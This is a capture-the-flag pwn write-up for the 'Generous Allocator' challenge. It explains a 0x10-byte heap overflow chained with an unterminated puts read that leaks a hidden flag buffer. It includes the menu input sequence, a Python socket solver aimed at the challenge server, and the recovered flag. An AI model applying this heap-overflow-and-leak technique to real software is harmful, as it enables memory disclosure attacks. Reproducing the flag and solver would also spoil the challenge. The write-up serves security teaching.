# Generous Allocator - Writeup

**Author:** co3lho22  
**Category:** pwn  
**Flag format:** `upCTF{...}`

## Summary
The binary is a menu-based heap manager with a hidden option (`f`) that reads `flag.txt` into a heap buffer but never prints it. Two bugs can be chained to leak that hidden buffer.

Recovered flag:

`upCTF{h34d3r_1nclud3d_by_m4ll0c-c2hSGa8Nc900ce90}`

## Program Behavior
Visible menu options:

1. malloc
2. free
3. read
4. write
5. quit

Hidden option:

- `f` -> `read_flag()`

`read_flag()` does:
- `fopen("flag.txt", "r")`
- `malloc(0x2b1)`
- `fread(..., 0x2b0, ...)`
- NUL-terminates the read bytes
- does **not** print or store pointer in the public table

## Vulnerabilities
1. **Heap overflow in write path**
- `manage_allocation(size)` allocates exactly `malloc(size)`.
- It stores `ptr_size_table[i] = size + 0x10`.
- `write_operation()` writes up to `ptr_size_table[i]` bytes into the chunk.
- Result: controlled overflow of exactly `0x10` bytes into the next chunk header.

2. **Out-of-bounds disclosure via puts**
- `read_operation()` uses `puts(ptr_table[i])`.
- If attacker data is not NUL-terminated in-bounds, `puts` continues reading into adjacent memory.

## Exploit Idea
- Trigger `f` once as allocator warm-up.
- Allocate user chunk 0 of size 64.
- Trigger `f` again so flag buffer lands in a favorable nearby heap region.
- Write 80 bytes (`64 + 0x10`) into chunk 0 with no NUL bytes.
- Read chunk 0 using option 3.
- `puts` walks into adjacent area and leaks `upCTF{...}`.

## Working Remote Payload
Target: `nc 46.225.117.62 30014`

Interaction sequence:

- `f`
- `1`, `64`
- `f`
- `4`, `0`, `"A" * 80`
- `3`, `0`
- `5`

## One-liner Solver Used
```python
import socket,re
p=b'\n'.join([b'f',b'1',b'64',b'f',b'4',b'0',b'A'*80,b'3',b'0',b'5'])+b'\n'
s=socket.create_connection(('46.225.117.62',30014),5)
s.settimeout(2)
out=s.recv(4096)
s.sendall(p)
while True:
    try:
        d=s.recv(65535)
    except Exception:
        break
    if not d:
        break
    out+=d
s.close()
print(re.search(rb'upCTF\{[^}]+\}',out).group(0).decode())
```

## Notes
- The challenge intentionally hints at heap metadata mishandling.
- The key bug is treating `size + 0x10` as writable user space.
- No fancy glibc hook overwrite is needed; simple overflow + `puts` leak is enough.
